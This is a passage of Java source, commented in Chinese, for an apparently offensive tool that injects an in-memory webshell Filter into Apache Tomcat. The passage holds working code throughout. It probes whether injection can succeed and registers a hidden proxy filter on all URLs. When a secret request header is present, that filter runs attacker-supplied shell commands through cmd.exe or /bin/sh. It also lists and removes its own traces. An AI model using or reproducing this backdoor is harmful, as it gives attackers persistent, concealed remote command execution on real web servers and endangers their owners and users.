        try {
            Object hv = call(req, "getHeader", gateHeader);
            if (hv != null && gateValue.equals(String.valueOf(hv))) {
                Object cv = call(req, "getParameter", cmdParam);
                if (cv != null) {
                    String out = execText(String.valueOf(cv));
                    call(res, "setContentType", "text/plain;charset=utf-8");
                    Object w = call(res, "getWriter");
                    call(w, "write", out);
                    call(w, "flush");
                    return null;
                }
            }
        } catch (Throwable ignored) {
            // 门禁判断一旦出错就按普通流量放行，不能把业务打挂
        }
        java.lang.reflect.Method[] ms = chain.getClass().getMethods();
        for (int i = 0; i < ms.length; i++) {
            if ("doFilter".equals(ms[i].getName()) && ms[i].getParameterTypes().length == 2) {
                ms[i].invoke(chain, req, res);
                break;
            }
        }
        return null;
    }

    /** 探测：能不能注入内存马，取决于上下文是否可达、容器 API 是哪一套。 */
    private static String msProbe() {
        String api = "unknown";
        try {
            Class.forName("jakarta.servlet.Filter");
            api = "jakarta";
        } catch (Throwable t) {
            try {
                Class.forName("javax.servlet.Filter");
                api = "javax";
            } catch (Throwable ignored) {
                // 非 Servlet 容器
            }
        }
        Object ctx = null;
        String reason = "";
        try {
            ctx = stdCtx();
        } catch (Throwable t) {
            reason = t.getClass().getSimpleName() + ": " + t.getMessage();
        }
        StringBuilder sb = new StringBuilder("{");
        sb.append("\"servletApi\":").append(json(api));
        sb.append(",\"serverInfo\":").append(json(serverInfo()));
        sb.append(",\"contextAvailable\":").append(ctx != null);
        sb.append(",\"canInject\":").append(ctx != null && !"unknown".equals(api));
        if (ctx != null) {
            sb.append(",\"contextPath\":").append(json(String.valueOf(safeCall(ctx, "getPath"))));
            Object defs = safeCall(ctx, "findFilterDefs");
            sb.append(",\"filterCount\":").append(defs != null && defs.getClass().isArray()
                    ? java.lang.reflect.Array.getLength(defs) : -1);
        } else {
            sb.append(",\"reason\":").append(json(reason));
        }
        return sb.append('}').toString();
    }

    /** 注入 Filter 内存马：FilterDef + FilterMap + filterConfigs 三处都要登记。 */
    private static String msInject(String name, String gateHeader, String gateValue, String cmdParam) throws Exception {
        if (name == null || name.length() == 0) {
            return "ERROR:缺少 filter 名";
        }
        if (gateHeader == null || gateHeader.length() == 0 || gateValue == null || gateValue.length() == 0) {
            return "ERROR:缺少触发头（gate_header / gate_value）";
        }
        String cp = cmdParam == null || cmdParam.length() == 0 ? "cmd" : cmdParam;
        Object ctx = stdCtx();
        Class<?> fi = filterIface();

        Payload handler = new Payload();
        handler.gateHeader = gateHeader;
        handler.gateValue = gateValue;
        handler.cmdParam = cp;
        Object proxy = java.lang.reflect.Proxy.newProxyInstance(
                fi.getClassLoader(), new Class<?>[]{fi}, handler);

        Class<?> fdCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Object fd = fdCls.newInstance();
        call(fd, "setFilterName", name);
        call(fd, "setFilterClass", proxy.getClass().getName());
        call(fd, "setFilter", proxy);
        call(ctx, "addFilterDef", fd);

        Class<?> fmCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Object fm = fmCls.newInstance();
        call(fm, "setFilterName", name);
        call(fm, "addURLPattern", "/*");
        call(fm, "setDispatcher", "REQUEST");
        call(ctx, "addFilterMapBefore", fm);

        // 关键一步：只加 FilterDef/FilterMap 还不够，Tomcat 用 filterConfigs 缓存
        // 已实例化的过滤器，不塞进去首次请求会拿不到实例。
        Class<?> cfgCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        java.lang.reflect.Constructor<?> ctor = cfgCls.getDeclaredConstructor(
                Class.forName("org.apache.catalina.Context"), fdCls);
        ctor.setAccessible(true);
        Object cfg = ctor.newInstance(ctx, fd);
        Object map = field(ctx, "filterConfigs");
        if (map instanceof java.util.Map) {
            ((java.util.Map) map).put(name, cfg);
        }
        return "OK filter=" + name + " gate=" + gateHeader + ": " + gateValue
                + " param=" + cp + " url=/*";
    }

    /** 枚举当前上下文里的 Filter，用于确认注入结果与清理痕迹。 */
    private static String msList() throws Exception {
        Object ctx = stdCtx();
        StringBuilder sb = new StringBuilder("{\"filters\":[");
        Object defs = call(ctx, "findFilterDefs");
        if (defs != null && defs.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(defs);
            for (int i = 0; i < n; i++) {
                Object d = java.lang.reflect.Array.get(defs, i);
                if (i > 0) {
                    sb.append(',');
                }
                sb.append("{\"name\":").append(json(String.valueOf(safeCall(d, "getFilterName"))))
                        .append(",\"class\":").append(json(String.valueOf(safeCall(d, "getFilterClass"))))
                        .append('}');
            }
        }
        sb.append("],\"maps\":[");
        Object maps = call(ctx, "findFilterMaps");
        if (maps != null && maps.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(maps);
            for (int i = 0; i < n; i++) {
                Object m = java.lang.reflect.Array.get(maps, i);
                if (i > 0) {
                    sb.append(',');
                }
                sb.append("{\"name\":").append(json(String.valueOf(safeCall(m, "getFilterName"))))
                        .append('}');
            }
        }
        return sb.append("]}").toString();
    }

    /** 卸载：三处登记都清掉，避免留下「能触发但列不出来」的残影。 */
    private static String msRemove(String name) throws Exception {
        if (name == null || name.length() == 0) {
            return "ERROR:缺少 filter 名";
        }
        Object ctx = stdCtx();
        int hit = 0;

        // FilterDef / FilterMap 优先走 StandardContext 的公开方法：
        // 直接改字段在不同 Tomcat 版本上字段名会变（filterMaps 在 10.x 里就不是
        // 我们原先假设的位置），公开方法是稳定的注入/卸载路径。
        Object defs = safeCall(ctx, "findFilterDefs");
        if (defs != null && defs.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(defs);
            for (int i = 0; i < n; i++) {
                Object d = java.lang.reflect.Array.get(defs, i);
                Object fn = safeCall(d, "getFilterName");
                if (fn != null && name.equals(String.valueOf(fn))) {
                    safeCall(ctx, "removeFilterDef", d);
                    hit++;
                }
            }
        }
        Object maps = safeCall(ctx, "findFilterMaps");
        if (maps != null && maps.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(maps);
            for (int i = 0; i < n; i++) {
                Object fm = java.lang.reflect.Array.get(maps, i);
                Object fn = safeCall(fm, "getFilterName");
                if (fn != null && name.equals(String.valueOf(fn))) {
                    safeCall(ctx, "removeFilterMap", fm);
                    hit++;
                }
            }
        }
        // filterConfigs 是实例缓存，没有公开移除接口，只能拔字段
        Object cfgs = safeCall(ctx, "getFilterConfigs");
        if (cfgs == null) {
            try {
                cfgs = field(ctx, "filterConfigs");
            } catch (NoSuchFieldException ignored) {
                // 版本差异，忽略
            }
        }
        if (cfgs instanceof java.util.Map && ((java.util.Map) cfgs).remove(name) != null) {
            hit++;
        }
        return "OK removed " + name + "（清理 " + hit + " 处登记）";
    }

    private static Object stdCtx() throws Exception {
        if (sApp == null) {
            throw new IllegalStateException("载体未注入 ServletContext：内存马只能在 JSP 上下文内操作");
        }
        Object o = sApp;
        for (int i = 0; i < 3; i++) {
            if (o.getClass().getName().endsWith("StandardContext")) {
                return o;
            }
            try {
                o = field(o, "context");
            } catch (NoSuchFieldException e) {
                break;
            }
        }
        if (o.getClass().getName().endsWith("StandardContext")) {
            return o;
        }
        throw new IllegalStateException("无法从 ServletContext 定位 StandardContext（当前 "
                + sApp.getClass().getName() + "）");
    }

    private static Class<?> filterIface() throws Exception {
        try {
            return Class.forName("jakarta.servlet.Filter");
        } catch (Throwable ignored) {
            return Class.forName("javax.servlet.Filter");
        }
    }

    private static String serverInfo() {
        Object v = safeCall(sApp, "getServerInfo");
        return v == null ? "" : String.valueOf(v);
    }

    /** 递归取字段（子类没声明就往父类找）。 */
    private static Object field(Object o, String name) throws Exception {
        return fieldRef(o, name).get(o);
    }

    private static java.lang.reflect.Field fieldRef(Object o, String name) throws Exception {
        Class<?> c = o.getClass();
        while (c != null) {
            try {
                java.lang.reflect.Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    /** 按「名字 + 参数个数」找方法调用；重载多时靠参数类型不匹配自然跳过。 */
    private static Object call(Object o, String name, Object... args) throws Exception {
        java.lang.reflect.Method[] ms = o.getClass().getMethods();
        Exception last = null;
        for (int i = 0; i < ms.length; i++) {
            java.lang.reflect.Method m = ms[i];
            if (!name.equals(m.getName()) || m.getParameterTypes().length != args.length) {
                continue;
            }
            try {
                m.setAccessible(true);
                return m.invoke(o, args);
            } catch (IllegalArgumentException e) {
                last = e;
            }
        }
        throw last != null ? last : new NoSuchMethodException(name);
    }

    private static Object safeCall(Object o, String name, Object... args) {
        try {
            return call(o, name, args);
        } catch (Throwable t) {
            return null;
        }
    }

    /** 内存马里的命令执行：只要输出，不拼工作目录标记。 */
    private static String execText(String cmd) throws IOException, InterruptedException {
        String os = System.getProperty("os.name", "").toLowerCase();
        boolean win = os.indexOf("win") >= 0;
        String[] argv = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};
        ProcessBuilder pb = new ProcessBuilder(argv);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(p.getInputStream(), out);
        p.waitFor();
        return new String(out.toByteArray());
    }

    /** 极简 JSON 字符串转义：只处理会让 JSON 非法的那几个字符。 */
    private static String json(String s) {
        if (s == null) {
            return "null";
        }
        StringBuilder sb = new StringBuilder(s.length() + 8);
        sb.append('"');
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':
                    sb.append("\\\"");
                    break;
                case '\\':
                    sb.append("\\\\");
                    break;
                case '\n':
                    sb.append("\\n");
                    break;
                case '\r':
                    sb.append("\\r");
                    break;
                case '\t':
                    sb.append("\\t");
                    break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.append('"').toString();
    }

    private static final char[] B64 =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();

    /** 自带 base64：JDK 8 有 java.util.Base64，但目标可能跑在 JDK 6/7 上。 */
    private static String b64(byte[] data) {
        StringBuilder sb = new StringBuilder((data.length + 2) / 3 * 4);
        int i = 0;
        while (i + 2 < data.length) {
            int n = ((data[i] & 0xff) << 16) | ((data[i + 1] & 0xff) << 8) | (data[i + 2] & 0xff);
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63])
                    .append(B64[(n >> 6) & 63]).append(B64[n & 63]);
            i += 3;
        }
        int rest = data.length - i;
        if (rest == 1) {
            int n = (data[i] & 0xff) << 16;
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63]).append("==");
        } else if (rest == 2) {
            int n = ((data[i] & 0xff) << 16) | ((data[i + 1] & 0xff) << 8);
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63])
                    .append(B64[(n >> 6) & 63]).append('=');
        }
        return sb.toString();
    }

    private static byte[] unb64(String s) {
        ByteArrayOutputStream out = new ByteArrayOutputStream(s.length() * 3 / 4 + 4);
        int buf = 0;
        int bits = 0;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '=' || c == '\n' || c == '\r') {
                continue;
            }
            int v = index(c);
            if (v < 0) {
                continue;
            }
            buf = (buf << 6) | v;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                out.write((buf >> bits) & 0xff);
            }
        }
        return out.toByteArray();
    }

    private static int index(char c) {
        for (int i = 0; i < B64.length; i++) {
            if (B64[i] == c) {
                return i;
            }
        }
        return -1;
    }

    private static void copy(InputStream in, ByteArrayOutputStream out) throws IOException {
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) {
            out.write(buf, 0, n);
        }
        in.close();
    }
}
